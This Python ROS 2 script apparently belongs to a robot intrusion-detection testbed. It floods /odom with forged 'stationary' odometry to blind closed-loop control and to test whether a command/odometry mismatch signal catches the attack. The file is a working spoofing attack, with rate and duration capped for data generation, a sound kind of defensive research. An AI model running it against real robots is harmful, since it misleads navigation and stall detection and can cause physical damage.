#!/usr/bin/env python3
"""N34 — odometry 偽造：讓機器人以為自己沒有在動。

## 這一類要打的是什麼

`odom_spoof` 是 `action_policy.json` 二十三條規則之一，但**從來沒有 runner
產生過資料**。

攻擊的想法不是讓機器人亂走，而是**破壞它對自己的認知**：持續 publish
「速度為零、位置不變」的 `/odom`，同時真正的 `/cmd_vel` 仍在下達非零速度。
任何以 odometry 做閉環的行為（走到定點、偵測卡住、里程計時）都會被誤導。

## 專屬訊號的假設（事前寫下）

`odom_cmd_mismatch_ratio` 這個 telemetry 特徵已經存在且在 1,100 場裡有 1.66%
的視窗非零，所以**訊號通道是活的**。它比對的正是「指令說在動、odometry 說
沒動」，也就是這個攻擊的定義。

預期：`control_observation` 的 mismatch 計數變高；guard 是否鎖定取決於防禦
設計，不預設。

⚠️ 這一支刻意**偽造成靜止而不是偽造成高速**。偽造高速會同時觸發速度上限
偵測（d1），那樣專屬訊號會與 `cmd_vel_injection` 混在一起——2026-09-02 的
`health_spoof`／`mission_spoof` 就是因為訊號重疊而差點分不開。
「靜止」是這一類獨有的那一面。

## 用法

    python3 N34_odom_spoof.py <duration_sec> [--rate-hz 20]

沒有憑證、不需要 root。
"""

from __future__ import annotations

import sys
import time

import rclpy
from nav_msgs.msg import Odometry
from rclpy.executors import ExternalShutdownException
from rclpy.node import Node
from rclpy.parameter import Parameter

MAX_DURATION_SEC = 300.0
MIN_RATE_HZ = 1.0
MAX_RATE_HZ = 100.0
# 真 odometry 的發布頻率。攻擊必須**蓋過**它才有效；低於它的話訂閱者大部分
# 時間仍拿到真值，量到的會是零星 mismatch 而不是持續的認知錯亂。
TYPICAL_ODOM_HZ = 30.0


class OdomSpoofer(Node):
    def __init__(self, rate_hz: float):
        super().__init__(
            "odom_spoof_probe",
            start_parameter_services=False,
            enable_rosout=False,
            parameter_overrides=[
                Parameter("start_type_description_service",
                          Parameter.Type.BOOL, False),
            ],
        )
        self._pub = self.create_publisher(Odometry, "/odom", 10)
        self.sent = 0
        self.create_timer(1.0 / rate_hz, self._publish_lie)

    def _publish_lie(self) -> None:
        msg = Odometry()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.header.frame_id = "odom"
        msg.child_frame_id = "base_footprint"
        # 位置與速度全部維持在原點與零：「我沒有在動」。
        # 姿態的 w 必須是 1.0，否則是非法四元數，會被當成畸形訊息而不是謊言。
        msg.pose.pose.orientation.w = 1.0
        self._pub.publish(msg)
        self.sent += 1


def main() -> int:
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 20.0
    rate = TYPICAL_ODOM_HZ * 1.5
    if "--rate-hz" in sys.argv:
        rate = float(sys.argv[sys.argv.index("--rate-hz") + 1])
    duration = max(1.0, min(duration, MAX_DURATION_SEC))
    rate = max(MIN_RATE_HZ, min(rate, MAX_RATE_HZ))

    print(f"☠️ N34: 以 {rate:.1f}Hz publish「靜止」的 /odom，共 {duration:.1f} 秒",
          flush=True)

    rclpy.init()
    node = None
    try:
        node = OdomSpoofer(rate)
        deadline = time.monotonic() + duration
        while time.monotonic() < deadline and rclpy.ok():
            rclpy.spin_once(node, timeout_sec=0.05)
    except (KeyboardInterrupt, ExternalShutdownException):
        pass
    finally:
        sent = node.sent if node is not None else 0
        if node is not None:
            node.destroy_node()
        # SIGTERM 時 rclpy 已經 shutdown 過 context；重複呼叫會讓退出碼變 1，
        # 而那在 gate 眼裡是「攻擊沒有執行」。
        if rclpy.ok():
            rclpy.shutdown()
        print(f"✅ N34 結束：送出 {sent} 筆偽造 odometry", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
